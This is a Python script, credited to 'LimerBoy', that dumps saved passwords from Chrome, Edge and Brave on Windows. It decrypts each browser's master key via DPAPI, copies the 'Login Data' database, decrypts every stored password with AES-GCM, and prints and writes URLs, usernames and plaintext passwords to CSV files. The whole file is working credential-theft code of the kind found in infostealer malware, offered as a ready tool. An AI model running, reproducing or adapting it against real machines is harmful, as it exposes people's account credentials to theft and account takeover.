#Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# Paths for different browsers
BROWSERS = {
    "chrome": {
        "local_state": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data\Local State"),
        "user_data": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data"),
    },
    "edge": {
        "local_state": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Microsoft\Edge\User Data\Local State"),
        "user_data": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Microsoft\Edge\User Data"),
    },
    "brave": {
        "local_state": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"),
        "user_data": os.path.join(os.environ['USERPROFILE'], r"AppData\Local\BraveSoftware\Brave-Browser\User Data"),
    }
}

def get_secret_key(browser):
    """Retrieve and decrypt the secret key for the specified browser."""
    try:
        with open(BROWSERS[browser]["local_state"], "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERROR] Could not retrieve secret key for {browser}: {e}")
        return None

def decrypt_payload(cipher, payload):
    """Decrypt the given payload using the provided cipher."""
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    """Generate an AES cipher using the given key and IV."""
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    """Decrypt a Chrome-based browser password using the secret key and ciphertext."""
    try:
        iv = ciphertext[3:15]  # Extract the initialization vector (IV)
        encrypted_password = ciphertext[15:-16]  # Extract the encrypted password
        cipher = generate_cipher(secret_key, iv)
        decrypted_password = decrypt_payload(cipher, encrypted_password).decode()  # Decrypt and decode
        return decrypted_password
    except Exception as e:
        print(f"[ERROR] Could not decrypt password: {e}")
        return ""

def get_db_connection(chrome_login_db):
    """Copy and connect to the Chromium-based browser's SQLite Login Data database."""
    try:
        shutil.copy2(chrome_login_db, "Loginvault.db")  # Make a temp copy
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERROR] Could not connect to database: {e}")
        return None

def extract_login_data(cursor):
    """Extract login credentials (URL, username, encrypted password) from the database cursor."""
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        return cursor.fetchall()
    except sqlite3.Error as e:
        print(f"[ERROR] Failed to fetch login data: {e}")
        return []

def process_profile(secret_key, profile_folder, csv_writer, browser):
    """Process a specific browser profile folder and extract login credentials."""
    login_db_path = os.path.join(BROWSERS[browser]["user_data"], profile_folder, "Login Data")
    conn = get_db_connection(login_db_path)
    
    if not conn or not secret_key:
        return
    
    try:
        cursor = conn.cursor()
        logins = extract_login_data(cursor)
        for index, (url, username, encrypted_password) in enumerate(logins):
            if url and username and encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, secret_key)
                if decrypted_password:
                    print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'*'*50}")
                    csv_writer.writerow([index, url, username, decrypted_password])
    except Exception as e:
        print(f"[ERROR] Failed to process profile '{profile_folder}' for {browser}: {e}")
    finally:
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            print(f"[ERROR] Could not delete temp file 'Loginvault.db': {e}")

def process_browser(browser):
    """Process all profiles for a given browser."""
    try:
        # Initialize CSV file for storing decrypted passwords
        csv_filename = f'decrypted_passwords_{browser}.csv'
        with open(csv_filename, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["Index", "URL", "Username", "Password"])

            # Step 1: Get the secret key
            secret_key = get_secret_key(browser)
            if not secret_key:
                print(f"[ERROR] Could not retrieve secret key for {browser}. Skipping...")
                return

            # Step 2: Identify profile folders
            profile_folders = [f for f in os.listdir(BROWSERS[browser]["user_data"]) if re.match(r"^Profile.*|^Default$", f)]

            # Step 3: Process each profile to extract passwords
            for profile in profile_folders:
                print(f"Processing {browser} profile: {profile}")
                process_profile(secret_key, profile, csv_writer, browser)

            print(f"[INFO] Password decryption complete for {browser}. Check '{csv_filename}' for results.")
    
    except Exception as e:
        print(f"[ERROR] Unexpected error processing {browser}: {e}")

if __name__ == '__main__':
    try:
        # Process Chrome, Edge, and Brave
        for browser in BROWSERS:
            process_browser(browser)
    
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
